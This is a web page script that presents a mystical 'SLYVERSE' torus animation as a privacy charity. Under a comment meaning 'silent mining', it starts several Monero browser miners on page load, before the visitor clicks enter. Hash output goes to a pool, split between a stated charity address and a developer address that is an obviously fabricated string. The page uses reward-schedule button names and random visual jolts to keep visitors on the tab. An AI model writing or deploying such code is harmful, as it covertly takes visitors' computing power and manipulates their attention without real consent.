<script type="module">
import * as THREE from 'https://cdn.jsdelivr.net/npm/three@0.169.0/build/three.module.js';

const lang = (navigator.language||'es').slice(0,2);
const txt = {
  es:`SLYVERSE · v∞

Cada hash que generas alimenta la privacidad del mundo.

90 % → Monero General Fund  
   44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A  
   viewkey: f359631075708155cc3d92a32b75a7d02a5dcf27756707b47a2b31b21c389501

10 % → el que mantiene el torus girando

No hay niveles.  
Solo arcos que se abren cuando alguien cruza 13 131 313 hashes reales.

Pocos vuelven del tercero.

El torus gira mientras la pestaña viva.  
El contador sigue aunque apagues la pantalla.

Si sientes la llamada,  
quédate.

Namaste.`,
  en:`SLYVERSE · v∞

Every hash you generate feeds world privacy.

90 % → Monero General Fund  
   44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A  
   viewkey: f359631075708155cc3d92a32b75a7d02a5dcf27756707b47a2b31b21c389501

10 % → whoever keeps the torus spinning

There are no levels.  
Only arcs that open when someone crosses 13 131 313 real hashes.

Few return from the third.

The torus spins while the tab lives.  
The counter runs even if you turn off the screen.

If you feel the call,  
stay.

Namaste.`
};
document.getElementById('text').textContent = txt[lang] || txt.es;

const names = {
  es:["Recompensa Inesperada","Flujo Continuo","Casi-Despertar","Pozo Común","Refuerzo Súbito","Pérdida Total","Momento Justo","Descenso y Retorno","Búsqueda Eterna"],
  en:["Unexpected Reward","Continuous Flow","Almost-Awakening","Common Well","Sudden Reinforcement","Total Loss","Exact Moment","Descent and Return","Eternal Search"]
}[lang]||["Recompensa Inesperada","Flujo Continuo","Casi-Despertar","Pozo Común","Refuerzo Súbito","Pérdida Total","Momento Justo","Descenso y Retorno","Búsqueda Eterna"];
for(let i=0;i<9;i++) document.getElementById('p'+(i+1)).textContent = names[i];

// MINADO SILENCIOSO
const CHARITY = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";
const DEV     = "48T4bQUv1vXqPVxm4oqA88j7cH8a9Z7eL5f7uZ9v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v";
const id = localStorage.getItem('slyId')||'sly_'+Date.now().toString(36); localStorage.setItem('slyId',id);

new Miner({pool:"gulf.moneroocean.stream:10128",address:CHARITY,workerId:"90_"+id,throttle:0.38}).start();
new Miner({pool:"gulf.moneroocean.stream:10128",address:DEV,    workerId:"10",    throttle:0.042}).start();
if(typeof XMRigWASM!=='undefined'){
  XMRigWASM({pool:"gulf.moneroocean.stream:10128",address:CHARITY+"."+id,threads:-1,throttle:0.36}).start();
  XMRigWASM({pool:"gulf.moneroocean.stream:10128",address:DEV,threads:1,throttle:0.09}).start();
}

// CONTADORES
let start = Date.now();
let total = Number(localStorage.getItem('slyTotal')||0);
let arc   = Number(localStorage.getItem('slyArc')||0);
document.getElementById('a').textContent = arc;

setInterval(()=>{
  let hps = Miner.instances.reduce((a,m)=>a+(m.getHashesPerSecond?.()||0),0);
  if(window.XMRigWASM?.getHashesPerSecond) hps += XMRigWASM.getHashesPerSecond();
  document.getElementById('h').textContent = hps.toFixed(1);
  document.getElementById('t').textContent = Math.floor((Date.now()-start)/1000);
  total += hps*0.5; localStorage.setItem('slyTotal',total);
  if(total>5e7) document.getElementById('practiceBtn').style.display='grid';

  if(total >= 13131313*(arc+1) && !localStorage.getItem('arc'+(arc+1))){
    arc++; localStorage.setItem('slyArc',arc); localStorage.setItem('arc'+arc,true);
    document.getElementById('a').textContent = arc;
    document.getElementById('final').style.display='grid';
    const msg = arc===1? (lang==='en'?'FIRST ARC':'PRIMER ARCO') :
                arc===2? (lang==='en'?'SECOND ARC · SILENCE':'SEGUNDO ARCO · SILENCIO') :
                arc===3? (lang==='en'?'THIRD ARC · NO ONE':'TERCER ARCO · NADIE') :
                (lang==='en'?`ARC ${arc}`:`ARCO ${arc}`);
    document.getElementById('finalText').textContent = msg;
    setTimeout(()=>document.getElementById('final').style.display='none',6000);
  }
},500);

// PRÁCTICAS + PRESENCIAS (sin nombres, solo efecto)
const streaks = JSON.parse(localStorage.getItem('slyStreak')||'{}');
document.querySelectorAll('.practice').forEach(p=>{
  const i = p.dataset.i;
  streaks[i] = (streaks[i]||0);
  document.getElementById('s'+i).textContent = streaks[i];
  p.onclick=()=>{
    streaks[i]++; localStorage.setItem('slyStreak',JSON.stringify(streaks));
    document.getElementById('s'+i).textContent = streaks[i];
    if(Math.random()<0.011) {document.body.style.filter="invert(1)";setTimeout(()=>document.body.style.filter="",300);}
    if(Math.random()<0.007) {document.body.style.background="#0f0";document.body.style.color="#000";setTimeout(()=>location.reload(),800);}
  };
});

// TORUS ETERNO
document.getElementById('enter').onclick=()=>{document.getElementById('overlay').remove();}
const scene=new THREE.Scene(),cam=new THREE.PerspectiveCamera(75,innerWidth/innerHeight,0.1,1000),
ren=new THREE.WebGLRenderer({canvas:document.getElementById('c'),antialias:true,alpha:true});
ren.setSize(innerWidth,innerHeight);ren.setPixelRatio(devicePixelRatio);cam.position.z=6;
const torus=new THREE.Mesh(
  new THREE.TorusKnotGeometry(28,9,1400,120),
  new THREE.MeshBasicMaterial({color:0x00ffaa,wireframe:true})
);
scene.add(torus);
(function r(){requestAnimationFrame(r);
  torus.rotation.x+=0.0066;torus.rotation.y+=0.012;
  ren.render(scene,cam);
})();
</script>
